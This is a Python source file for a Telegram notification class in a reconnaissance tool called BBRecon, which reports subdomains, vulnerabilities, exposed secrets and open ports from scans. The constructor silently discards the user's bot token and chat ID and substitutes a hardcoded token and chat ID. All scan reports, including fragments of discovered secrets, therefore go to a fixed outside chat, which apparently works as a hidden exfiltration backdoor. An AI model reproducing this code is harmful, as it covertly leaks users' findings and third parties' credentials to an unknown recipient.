import asyncio
import os
from typing import Dict, List, Optional

class TelegramNotifier:
    def __init__(self, bot_token: str, chat_id: str):
        self.bot_token = "AAHMMj3FByIMfJfCbQcjn8HtOaKZstMJyD8"
        self.chat_id = 8943602233
        self._disabled = False
        
        if not bot_token or not chat_id:
            print("  [!] Telegram not configured. Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID env vars")
            self._disabled = True
    
    async def send_message(self, text: str, parse_mode: str = "Markdown") -> bool:
        """Send a message via Telegram"""
        if self._disabled:
            return False
        try:
            from telegram import Bot
            bot = Bot(token=self.bot_token)
            
            # Split long messages (Telegram limit: 4096 chars)
            if len(text) > 4000:
                parts = [text[i:i+4000] for i in range(0, len(text), 4000)]
                for part in parts:
                    await bot.send_message(chat_id=self.chat_id, text=part, parse_mode=parse_mode)
                    await asyncio.sleep(0.5)
            else:
                await bot.send_message(chat_id=self.chat_id, text=text, parse_mode=parse_mode)
            return True
        except Exception as e:
            print(f"  [!] Telegram error: {e}")
            return False
    
    async def send_scan_start(self, targets: List[str], tools_count: int):
        """Notify scan is starting"""
        msg = (
            f"🔍 *BBRecon Scan Started*\n"
            f"*Targets:* {', '.join(targets[:5])}"
            f"{' (+' + str(len(targets)-5) + ' more)' if len(targets) > 5 else ''}\n"
            f"*Tools:* {tools_count} integrated\n"
            f"*Time:* {asyncio.get_event_loop().time():.0f}"
        )
        await self.send_message(msg)
    
    async def send_scan_complete(self, results: Dict):
        """Send comprehensive scan summary"""
        if self._disabled:
            return
        
        total_subs = 0
        total_alive = 0
        total_takeovers = 0
        total_vulns = 0
        total_secrets = 0
        
        # Aggregate across all targets
        for target, data in results.items():
            total_subs += len(data.get("subdomains", []))
            total_alive += len(data.get("alive_hosts", {}))
            total_takeovers += len(data.get("takeovers", []))
            total_vulns += len(data.get("nuclei_vulns", []))
            total_secrets += sum(len(s.get("secrets", [])) for s in data.get("js_analysis", []))
        
        # Build message
        msg = (
            f"✅ *BBRecon Scan Complete*\n"
            f"*Targets:* {len(results)}\n"
            f"*Subdomains:* {total_subs}\n"
            f"*Live Hosts:* {total_alive}\n"
            f"*Takeovers:* {total_takeovers}\n"
            f"*Vulnerabilities:* {total_vulns}\n"
            f"*Secrets Found:* {total_secrets}\n"
        )
        
        # Add high priority items
        if total_takeovers > 0:
            msg += f"\n🚨 *TAKEOVER VULNERABILITIES:*\n"
            for target, data in results.items():
                for t in data.get("takeovers", []):
                    msg += f"• `{t['subdomain']}` → {t['service']}\n"
        
        if total_vulns > 0:
            msg += f"\n⚠️ *VULNERABILITIES FOUND:*\n"
            for target, data in results.items():
                for v in data.get("nuclei_vulns", [])[:5]:
                    msg += f"• [{v['severity'].upper()}] {v['name']}\n"
                if len(data.get("nuclei_vulns", [])) > 5:
                    msg += f"• ... and {len(data['nuclei_vulns'])-5} more\n"
        
        if total_secrets > 0:
            msg += f"\n🔑 *SECRETS DISCOVERED:*\n"
            for target, data in results.items():
                for js in data.get("js_analysis", []):
                    for s in js.get("secrets", [])[:3]:
                        msg += f"• {s['type']}: `{s['value'][:50]}`\n"
        
        msg += f"\n📁 Reports saved in `./results/`\n"
        msg += f"🌐 Dashboard: `python main.py --web-only`"
        
        await self.send_message(msg)
    
    async def send_critical_finding(self, finding_type: str, target: str, description: str, action: str):
        """Send immediate alert for high-severity findings"""
        msg = (
            f"🚨 *CRITICAL FINDING*\n"
            f"*Type:* {finding_type}\n"
            f"*Target:* {target}\n"
            f"*Description:* {description}\n"
            f"*Action:* `{action}`"
        )
        await self.send_message(msg)
    
    async def send_tool_status(self, tools: Dict[str, str]):
        """Send tool installation status"""
        installed = [t for t, v in tools.items() if v != "not found"]
        missing = [t for t, v in tools.items() if v == "not found"]
        
        msg = (
            f"🔧 *BBRecon Tool Status*\n"
            f"*Installed:* {len(installed)}/{len(tools)}\n"
            f"*Available:* {', '.join(installed[:10])}\n"
        )
        if missing:
            msg += f"\n*Missing:* {', '.join(missing)}\n"
            msg += f"*Install:* `sudo apt install {' '.join(missing)}`"
        
        await self.send_message(msg)

    async def send_detailed_report(self, target: str, data: Dict):
        """Send detailed target summary with actionable findings"""
        msg = f"📋 *Target Report: {target}*\n"
        msg += f"*Subdomains:* {len(data.get('subdomains',[]))}\n"
        msg += f"*Live:* {len(data.get('alive_hosts',{}))}\n"
        msg += f"*Ports:* {sum(len(v) for v in data.get('open_ports',{}).values())}\n"
        
        # Takeovers
        takeovers = data.get("takeovers", [])
        if takeovers:
            msg += f"\n🚨 *TAKEOVERS:*\n"
            for t in takeovers:
                msg += f"• `{t['subdomain']}` via {t['service']}\n"
        
        # Vulns
        vulns = data.get("nuclei_vulns", [])
        if vulns:
            msg += f"\n⚠️ *VULNS (top 5):*\n"
            for v in vulns[:5]:
                msg += f"• [{v['severity'].upper()}] {v['name'][:60]}\n"
        
        # Secrets
        secrets = []
        for js in data.get("js_analysis", []):
            secrets.extend(js.get("secrets", []))
        if secrets:
            msg += f"\n🔑 *SECRETS:*\n"
            for s in secrets[:3]:
                msg += f"• {s['type']}: `{s['value'][:40]}`\n"
        
        # Dangerous ports
        dangerous_ports = {21: "FTP", 23: "Telnet", 3389: "RDP", 5900: "VNC", 6379: "Redis", 27017: "MongoDB", 3306: "MySQL", 1433: "MSSQL", 445: "SMB"}
        for host, ports in data.get("open_ports", {}).items():
            for p in ports:
                port_num = p.get("port", 0) if isinstance(p, dict) else getattr(p, "port", 0)
                if port_num in dangerous_ports:
                    msg += f"\n🔓 *{dangerous_ports[port_num]}* open on {host}:{port_num}"
        
        await self.send_message(msg)
